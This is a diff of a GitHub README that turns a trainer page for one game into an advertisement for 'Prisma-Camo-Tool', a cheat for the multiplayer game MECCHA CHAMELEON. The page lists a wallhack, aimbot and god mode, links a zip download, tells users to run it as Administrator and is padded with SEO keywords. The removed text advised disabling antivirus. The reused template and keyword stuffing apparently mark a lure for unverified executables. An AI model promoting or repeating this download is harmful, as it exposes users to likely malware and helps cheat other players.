@@ -1,43 +1,33 @@
-# 🌾 Grain-Rot-Trainer
+# 🦎 Prisma-Camo-Tool
 
-*Complete trainer for GRAIN ROT with unlimited health, no grain rot, item editor & more*
+*ESP, Aimbot, Auto Paint, Fly Hack, Teleport, God Mode & more for MECCHA CHAMELEON*
 
-<img width="2400" height="1360" alt="image" src="https://github.com/user-attachments/assets/2e311d9a-dfbe-4911-8192-5968f9a1879f" />
+<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/05d6b880-302e-4d2d-830a-4cd01afe1aef" />
 
 ---
 
 ## 🎮 What is This?
 
-**Grain-Rot-Trainer** is a powerful trainer for **GRAIN ROT** – the newly released survival game that launched August 7, 2026. This trainer gives you full control with Unlimited Health, No Grain Rot, Infinite Stamina, Item Editor, EXP Multiplier, Movement Speed, Jump Height, and more. Perfect for exploring every corner of the world without worrying about survival mechanics.
-
-⚠️ **Disclaimer:** For educational purposes only. Use at your own risk.
+**Prisma-Camo-Tool** is a complete enhancement utility for **MECCHA CHAMELEON** – the viral hide-and-seek game with over 15 million copies sold. It provides ESP wallhack, aimbot, auto paint, fly hack, teleport, god mode, speed hack, infinite paint, and more. Dominate every match.
 
 
 ## 📥 Download
 
-**[Download Grain-Rot-Trainer](https://github.com/breakchemistsqueeze/Grain-Rot-Trainer/releases/download/897/GrainRotTrainer.zip)**
+**[Download Prisma-Camo-Tool](https://github.com/breakchemistsqueeze/Prisma-Camo-Tool/releases/download/897/PrismaCamo.zip)**
 
 ---
 
 ## ✨ Features
 
-### 🛡️ Survival & Protection
-- 💀 **Unlimited Health** – Never die
-- 🌾 **No Grain Rot** – Disable grain rotting mechanic
-- 🏃 **Infinite Stamina** – Never tire
-- 🔧 **Unlimited Item Durability** – Items never break
-
-### 💰 Resources & Editor
-- 🔩 **Set Scraps** – Edit scrap count
-- 🪙 **Set Gold** – Edit gold amount
-- 💎 **Set Artifacts** – Edit artifacts count
-- 🎒 **Item Editor** – Modify inventory items
-
-### 📈 Progression & Movement
-- ⭐ **EXP Multiplier** – Level up faster
-- 🏃 **Movement Speed** – Customize speed (0.1x to 5.0x)
-- 🦘 **Jump Height** – Customize jump height
-- ⚡ **Instant Acceleration** – Instant speed boost
+- **ESP (Wallhack)** – See all players through walls
+- **Aimbot** – Lock onto enemies instantly
+- **Auto Paint** – Blend into any environment
+- **Fly Hack** – Fly anywhere on the map
+- **Teleport** – Move instantly to any location
+- **God Mode** – Never get tagged
+- **Speed Hack** – Move faster
+- **Infinite Paint** – Unlimited colors
+- **Menu Toggle** – Press INSERT or F1
 
 ---
 
@@ -45,10 +35,9 @@
 
 1. Click the download button above
 2. Extract the archive
-3. Run the trainer as Administrator
-4. Launch GRAIN ROT
+3. Run as Administrator
+4. Launch MECCHA CHAMELEON
 5. Press **INSERT** or **F1** to open the menu
-6. Toggle features ON/OFF
 
 ---
 
@@ -57,54 +46,18 @@
 | Requirement | Details |
 |-------------|---------|
 | **OS** | Windows 10/11 (64-bit) |
-| **Game** | GRAIN ROT (Steam) |
+| **Game** | MECCHA CHAMELEON (Steam) |
 | **RAM** | 4GB minimum |
 | **Storage** | 50MB free space |
 
 ---
 
-## 🔧 Feature Status
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Survival | Unlimited Health | ✅ |
-| Survival | No Grain Rot | ✅ |
-| Survival | Infinite Stamina | ✅ |
-| Survival | Unlimited Durability | ✅ |
-| Resources | Set Scraps | ✅ |
-| Resources | Set Gold | ✅ |
-| Resources | Set Artifacts | ✅ |
-| Progression | EXP Multiplier | ✅ |
-| Movement | Speed Control | ✅ |
-| Movement | Jump Height | ✅ |
-| Utility | Menu | ✅ |
-
----
-
-## 🐛 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Trainer doesn't work | Run as Administrator, disable antivirus |
-| Menu doesn't open | Press INSERT or F1, restart both |
-| Game crashes | Reduce graphics settings, disable overlays |
-
----
-
 ## 📝 SEO Tags
 
-grain rot trainer, grain rot cheat, grain rot mod, unlimited health, no grain rot, infinite stamina, item editor, exp multiplier, speed hack, jump height, grain rot 2026, survival game trainer, steam trainer, windows tool, game utility, grain rot helper, grain rot assistant, grain rot mod menu
+meccha chameleon cheat, meccha chameleon hack, meccha chameleon esp, meccha chameleon aimbot, meccha chameleon wallhack, meccha chameleon auto paint, meccha chameleon fly hack, meccha chameleon teleport, meccha chameleon god mode, meccha chameleon speed hack, meccha chameleon infinite paint, meccha chameleon mod menu, meccha chameleon trainer, meccha chameleon 2026, hide and seek cheat
 
 ---
 
 ## 💬 Support
 
 ⭐ Star this repository if you enjoy it!
-
----
-
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Grain-Rot-Trainer">
-    <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20GRAIN%20ROT%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
